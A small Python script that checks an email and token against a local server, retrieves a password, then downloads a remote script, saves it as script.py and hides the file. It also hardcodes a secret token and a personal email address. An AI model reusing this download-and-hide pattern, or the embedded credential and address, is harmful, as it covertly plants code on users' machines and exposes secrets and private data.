import urllib3
from utils import Utils
# import json
import os

utils = Utils()
token="11ecf1cefdc15d544843d84e5d28dd6440a8b1b64be5c2bbdce6cfe3582aa3582ef0ae2d60b2b13858791083277486e7910efd06af44d908bc8eba7b824834fa"

def CreateFile(name="",mode="",text=""):
    try:
        with open(name,mode) as f:
            if(f.mode == 'xt'and not(len(text) == 0)):
                f.write(text)
            f.close()
    except (FileExistsError,FileNotFoundError) as err:
        print("[*] Error",err.strerror)


def getKey(baseurl="", token="", email="",scriptDir=os.getcwd()):
    keyInfo = dict()
    filename = scriptDir+'\\script.py'
    urlcopy = baseurl
    http = urllib3.PoolManager()
    requestObject = http.request
    resp = requestObject('GET', urlcopy)
    if(resp.status == 200 and resp.data == b'OK'):
        urlcopy = urlcopy.split('/')
        urlcopy.append(f"verify/email/{email}/token/{token}")
        urlcopy = "/".join(urlcopy)
        resp = requestObject('GET', urlcopy)
        print(resp.status)
        if(resp.status == 200 and resp.data == b'verified'):
            urlcopy = baseurl.split('/')
            urlcopy.append("get-password")
            resp = requestObject('GET', "/".join(urlcopy))
            if(resp.status == 200 and len(resp.data) != 0):
                keyInfo['password'] = resp.data.decode('utf-8')
                urlcopy = baseurl.split('/')
                urlcopy.append('get-script')
                urlcopy = '/'.join(urlcopy)
                resp = requestObject('GET', urlcopy)
                if(resp.status == 200 and len(resp.data) != 0):
                    CreateFile(filename,'xt',text=resp.data.decode(encoding='utf-8'))
                    utils.HideFile(filenames=[filename])
                    keyInfo['filepath'] = filename
    return keyInfo


print(getKey('http://localhost:8000',token=token,email="abdulhameedotade@gmail.com"))
